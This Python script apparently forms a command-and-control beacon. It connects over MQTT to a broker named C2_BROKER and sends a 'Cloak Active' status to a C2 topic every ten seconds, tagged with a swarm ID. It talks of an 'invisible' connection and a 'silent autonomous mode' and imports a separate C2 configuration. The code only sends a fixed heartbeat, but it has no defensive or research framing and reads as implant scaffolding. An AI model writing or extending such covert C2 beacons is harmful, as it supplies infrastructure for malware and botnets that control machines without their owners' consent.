import time
import paho.mqtt.client as mqtt
from c2_config import *

def on_connect(client, userdata, flags, rc):
    print(f"[+] Connected to Global Mesh with code {rc}")

# Initialize the 'Invisible' Connection
client = mqtt.Client()
# client.tls_set() # Uncomment for real TLS encryption
client.on_connect = on_connect

try:
    client.connect(C2_BROKER, 1883, 60) # Using 1883 for simple testing
    client.loop_start()
except:
    print("[-] Mesh Offline. Operating in Silent Autonomous Mode.")

def report_to_general(status, detail):
    msg = wrap_signal(SWARM_ID, status, detail)
    client.publish(C2_TOPIC, msg)

print("--- [ GLOBAL WATCHER ACTIVE ] ---")
while True:
    # This simulates the self-healing loop reporting back
    report_to_general("STABLE", "Integrity 100% | Cloak Active")
    time.sleep(10)
